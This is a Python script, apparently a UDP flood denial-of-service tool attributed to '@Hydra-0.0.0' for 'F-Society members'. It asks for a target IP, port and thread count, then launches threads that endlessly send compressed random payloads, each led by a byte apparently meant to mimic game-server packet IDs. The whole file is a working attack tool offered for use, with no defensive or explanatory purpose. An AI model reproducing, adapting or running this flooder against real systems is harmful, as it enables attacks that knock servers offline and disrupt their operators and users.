import socket
import time
import os
import random
import zlib
import threading

# Code Written By @Hydra-0.0.0
# For F-Society members only.

def ngahhflooder(target_ip, target_port):
  pids = [
    b'\x01',
    b'\x05',
    b'\x07',
    b'\x84',
    b'\x13',
    b'\x80',
    b'\x09'
  ]
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      for i in range(300):
        bytelen = random.randint(512, 1024)
        bytes = os.urandom(bytelen)
        compressed_bytes = zlib.compress(bytes, level=9)
        pid = random.choice(pids)
        packet = pid + compressed_bytes
        s.sendto(packet, (target_ip, target_port))
      s.close()
    except Exception as e:
      print(f"[F-Society] Error: {e}")

banner = """
 _           _       _        ______      _____ 
| |         | |     | |       |  _  \    /  ___|
| |     ___ | | ___ | | _____ | | | |___ \ `--. 
| |    / _ \| |/ _ \| |/ / _ \| | | / _ \ `--. \
| |___| (_) | | (_) |   < (_) | |/ / (_) /\__/ /
\_____/\___/|_|\___/|_|\_\___/|___/ \___/\____/ 
Coded By @Hydra-0.0.0 - F-Society members only.
"""

os.system("clear")
print(banner)
print(" ")

try:
  target_ip = input("[‽] Target IP: ")
  target_port = int(input("[‽] Target Port: "))
  thrdc = int(input("[‽] Threads (Def 100): "))
  print("[F-Society] Attack will start when all threads all ready.")
  for i in range(thrdc):
    t = threading.Thread(target=ngahhflooder,args=(target_ip, target_port), daemon=True)
    t.start()
  os.system("clear")
  print(banner)
  print(" ")
  print(">> Attack Started! #F-Society <<")
  print(f"Target IP: {target_ip}")
  print(f"Target Port: {target_port}")
  print(f"Threads: {thrdc}")
  print(f"Use CTRL + C For Stop.")
  while True:
    time.sleep(1) # so that the code nd threads doesnt stop
except ValueError:
  print("[F-Society] Please Enter All Input's Correctly!")
except KeyboardInterrupt:
  print("[F-Society] Program Stopped By User (Exit)")
